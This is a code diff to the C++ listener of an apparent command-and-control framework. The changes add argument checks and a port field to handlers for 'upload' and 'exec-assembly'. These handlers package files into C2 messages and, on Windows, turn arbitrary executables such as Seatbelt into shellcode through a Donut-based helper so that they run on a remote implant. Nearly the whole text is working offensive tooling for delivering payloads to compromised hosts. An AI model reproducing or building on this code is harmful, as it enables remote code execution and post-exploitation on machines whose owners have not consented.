@@ -46,9 +46,10 @@ int creatShellCodeDonut(std::string cmd, std::string args, string& shellcode)
 }
 
 
-Listener::Listener(int idxSession)
+Listener::Listener(int idxSession, int port)
 {
 	m_idxSession = idxSession;
+	m_port = port;
 }
 
 
@@ -60,56 +61,82 @@ Listener::~Listener()
 
 bool Listener::execInstruction(std::vector<std::string>& splitedCmd, C2Message& c2Message)
 {
+	std::cout << "splitedCmd size " << splitedCmd.size() << std::endl;
+
 	if (splitedCmd[0] == "upload")
 	{
-		string inputFile = splitedCmd[1];
-		string outputFile = splitedCmd[2];
+		if (splitedCmd.size() == 3)
+		{
+			string inputFile = splitedCmd[1];
+			string outputFile = splitedCmd[2];
 
-		std::ifstream input(inputFile, std::ios::binary);
-		std::string buffer(std::istreambuf_iterator<char>(input), {});
+			std::ifstream input(inputFile, std::ios::binary);
+			std::string buffer(std::istreambuf_iterator<char>(input), {});
 
-		c2Message.set_instruction(splitedCmd[0]);
-		c2Message.set_inputfile(inputFile);
-		c2Message.set_outputfile(outputFile);
-		c2Message.set_data(buffer.data(), buffer.size());
+			c2Message.set_instruction(splitedCmd[0]);
+			c2Message.set_inputfile(inputFile);
+			c2Message.set_outputfile(outputFile);
+			c2Message.set_data(buffer.data(), buffer.size());
+		}
+		else
+		{
+			std::cout << "upload usage: upload inputFile outputFile" << std::endl;
+		}
 	}
 	else if (splitedCmd[0] == "exec-assembly")
 	{
-		string inputFile = splitedCmd[1];
 
 #ifdef __linux__ 
 
-		std::ifstream input(inputFile, std::ios::binary);
-		std::string buffer(std::istreambuf_iterator<char>(input), {});
-
-		std::string payload;
-		const char* bufferPtr = buffer.data();
-		for (int i = 0; i < buffer.size() / 4; i++)
+		if (splitedCmd.size() == 2)
 		{
-			unsigned char tmp = 0;
-			//sscanf(bufferPtr, "\\x%2hhx", &tmp);
-			sscanf_s(bufferPtr, "\\x%2hhx", &tmp);
-			bufferPtr += 4;
-			payload.push_back(tmp);
-		}
+			string inputFile = splitedCmd[1];
 
-		c2Message.set_instruction(splitedCmd[0]);
-		c2Message.set_inputfile(inputFile);
-		c2Message.set_data(payload.data(), payload.size());
+			std::ifstream input(inputFile, std::ios::binary);
+			std::string buffer(std::istreambuf_iterator<char>(input), {});
+
+			std::string payload;
+			const char* bufferPtr = buffer.data();
+			for (int i = 0; i < buffer.size() / 4; i++)
+			{
+				unsigned char tmp = 0;
+				//sscanf(bufferPtr, "\\x%2hhx", &tmp);
+				sscanf_s(bufferPtr, "\\x%2hhx", &tmp);
+				bufferPtr += 4;
+				payload.push_back(tmp);
+	}
+
+			c2Message.set_instruction(splitedCmd[0]);
+			c2Message.set_inputfile(inputFile);
+			c2Message.set_data(payload.data(), payload.size());
+		}
 
 #elif _WIN32
 
-		std::string cmd = "Seatbelt.exe";
-		std::string args = "-group=system";
-		std::string payload;
+		if (splitedCmd.size() > 1)
+		{
+			string args;
+			for (int i = 2; i < splitedCmd.size(); i++)
+			{
+				args += splitedCmd[i];
+				args += " ";
+			}
 
-		creatShellCodeDonut(inputFile, args, payload);
+			std::string inputFile = splitedCmd[1];
+			std::string payload;
 
-		std::cout << "exec-assembly " << inputFile << " " << args << " size payload " << payload.size() << std::endl;
+			creatShellCodeDonut(inputFile, args, payload);
 
-		c2Message.set_instruction(splitedCmd[0]);
-		c2Message.set_inputfile(inputFile);
-		c2Message.set_data(payload.data(), payload.size());
+			std::cout << "exec-assembly " << inputFile << " " << args << " size payload " << payload.size() << std::endl;
+
+			c2Message.set_instruction(splitedCmd[0]);
+			c2Message.set_inputfile(inputFile);
+			c2Message.set_data(payload.data(), payload.size());
+		}
+		else
+		{
+			std::cout << "exec-assembly usage: exec-assembly prog.exe args" << std::endl;
+		}
 
 #endif
 		
@@ -153,8 +180,7 @@ bool Listener::execInstruction(std::vector<std::string>& splitedCmd, C2Message& 
 
 #elif _WIN32
 
-		std::string cmd = "Seatbelt.exe";
-		std::string args = "-group=system";
+		std::string args = "";
 		std::string payload;
 
 		creatShellCodeDonut(inputFile, args, payload);
